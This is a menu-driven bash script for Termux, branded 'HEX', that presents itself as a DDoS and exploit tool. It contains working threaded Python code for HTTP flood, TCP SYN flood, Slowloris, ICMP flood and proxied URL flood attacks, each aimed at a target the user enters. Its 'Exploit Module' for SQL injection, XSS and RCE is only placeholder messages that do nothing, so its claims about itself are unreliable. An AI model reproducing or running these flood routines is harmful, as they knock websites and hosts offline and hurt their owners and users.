#!/bin/bash

# Check if required packages are installed
check_dependencies() {
    for pkg in figlet python3 curl scapy; do
        if ! command -v $pkg &> /dev/null; then
            echo "Installing $pkg..."
            pkg install $pkg -y
        fi
    done
}

# Username Verification
verify_user() {
    read -p "Enter username: " username
    if [ "$username" != "hackerhex" ]; then
        echo "Access Denied!"
        exit 1
    fi
}

# Display HEX Banner
show_banner() {
    clear
    figlet -f slant "HEX" | lolcat
    echo -e "\033[1;31m🔥 High-Level DDoS & Exploit Tool 🔥\033[0m"
    echo -e "\033[1;32m----------------------------------------------------\033[0m"
}

# HTTP Flood Attack
http_flood() {
    echo -e "\033[1;32m[+] HTTP Flood Attack on $1\033[0m"
    python3 -c "
import requests, threading
def attack():
    while True:
        try:
            requests.get('http://$1', timeout=5)
        except:
            pass
for i in range(1000):
    threading.Thread(target=attack).start()
"
}

# TCP SYN Flood Attack
tcp_syn_flood() {
    echo -e "\033[1;33m[+] TCP SYN Flood Attack on $1:$2\033[0m"
    python3 -c "
from scapy.all import *
import random, threading
def attack():
    while True:
        IP_layer = IP(dst='$1')
        TCP_layer = TCP(dport=$2, flags='S')
        send(IP_layer/TCP_layer, verbose=0)
for i in range(500):
    threading.Thread(target=attack).start()
"
}

# Slowloris Attack
slowloris_attack() {
    echo -e "\033[1;34m[+] Slowloris Attack on $1\033[0m"
    python3 -c "
import socket, time, threading
sockets = []
def attack():
    for i in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('$1', 80))
            s.send(b'GET / HTTP/1.1\\r\\n')
            sockets.append(s)
        except:
            break
        time.sleep(0.1)
for i in range(500):
    threading.Thread(target=attack).start()
"
}

# ICMP Flood Attack
icmp_flood() {
    echo -e "\033[1;35m[+] ICMP Flood Attack on $1\033[0m"
    python3 -c "
from scapy.all import *
import threading
def attack():
    while True:
        send(IP(dst='$1')/ICMP(), verbose=0)
for i in range(500):
    threading.Thread(target=attack).start()
"
}

# URL-based DDoS Attack
url_ddos() {
    echo -e "\033[1;36m[+] URL-based DDoS Attack on $1\033[0m"
    python3 -c "
import requests, threading
proxies = {'http': 'http://your_proxy_here', 'https': 'http://your_proxy_here'}
def attack():
    while True:
        try:
            requests.get('$1', proxies=proxies, timeout=5)
        except:
            pass
for i in range(1000):
    threading.Thread(target=attack).start()
"
}

# About Tools
about_tools() {
    clear
    echo -e "\033[1;36m📌 ABOUT TOOLS 📌\033[0m"
    echo -e "\033[1;32m1️⃣ HTTP Flood Attack:\033[0m Sends massive HTTP requests to overload a server."
    echo -e "\033[1;33m2️⃣ TCP SYN Flood Attack:\033[0m Floods target with SYN packets."
    echo -e "\033[1;34m3️⃣ Slowloris Attack:\033[0m Keeps connections open to exhaust resources."
    echo -e "\033[1;35m4️⃣ Ping (ICMP) Flood Attack:\033[0m Sends excessive ICMP packets."
    echo -e "\033[1;36m5️⃣ URL-based DDoS Attack:\033[0m Overloads a target URL with requests."
    echo -e "\033[1;31m6️⃣ Exploit Module:\033[0m Various hacking exploits."
    echo -e "\033[1;33mPress ENTER to return to menu...\033[0m"
    read
}

# Exploit Module
exploit_module() {
    clear
    echo -e "\033[1;36m📌 EXPLOIT MODULE 📌\033[0m"
    echo -e "\033[1;32m1️⃣ SQL Injection Exploit\033[0m"
    echo -e "\033[1;33m2️⃣ XSS Attack\033[0m"
    echo -e "\033[1;34m3️⃣ Remote Code Execution (RCE)\033[0m"
    echo -e "\033[1;35m4️⃣ Back to Menu\033[0m"
    read -p "👉 Select an option: " exploit_option

    case $exploit_option in
        1)
            echo "Running SQL Injection exploit..."
            ;;
        2)
            echo "Running XSS Attack..."
            ;;
        3)
            echo "Running Remote Code Execution..."
            ;;
        4)
            main_menu
            ;;
        *)
            echo "Invalid Option!"
            exploit_module
            ;;
    esac
}

# Main Menu
main_menu() {
    show_banner
    echo -e "\033[1;32m1️⃣ HTTP Flood Attack (DDoS)\033[0m"
    echo -e "\033[1;33m2️⃣ TCP SYN Flood Attack (DDoS)\033[0m"
    echo -e "\033[1;34m3️⃣ Slowloris Attack (DDoS)\033[0m"
    echo -e "\033[1;35m4️⃣ Ping (ICMP) Flood Attack (DDoS)\033[0m"
    echo -e "\033[1;36m5️⃣ URL-based DDoS Attack (DDoS)\033[0m"
    echo -e "\033[1;31m6️⃣ Exploit Module\033[0m"
    echo -e "\033[1;37m7️⃣ About Tools\033[0m"
    echo -e "\033[1;31m8️⃣ Exit\033[0m"
    read -p "👉 Select an option: " option
    
    case $option in
        1)
            read -p "Enter Target (example.com): " target
            http_flood $target
            ;;
        2)
            read -p "Enter Target IP: " target
            read -p "Enter Port: " port
            tcp_syn_flood $target $port
            ;;
        3)
            read -p "Enter Target IP: " target
            slowloris_attack $target
            ;;
        4)
            read -p "Enter Target IP: " target
            icmp_flood $target
            ;;
        5)
            read -p "Enter Target URL: " target
            url_ddos $target
            ;;
        6)
            exploit_module
            ;;
        7)
            about_tools
            main_menu
            ;;
        8)
            exit 0
            ;;
        *)
            echo -e "\033[1;31m❌ Invalid Option! Please choose again.\033[0m"
            main_menu
            ;;
    esac
}

# Run Script
check_dependencies
verify_user
main_menu
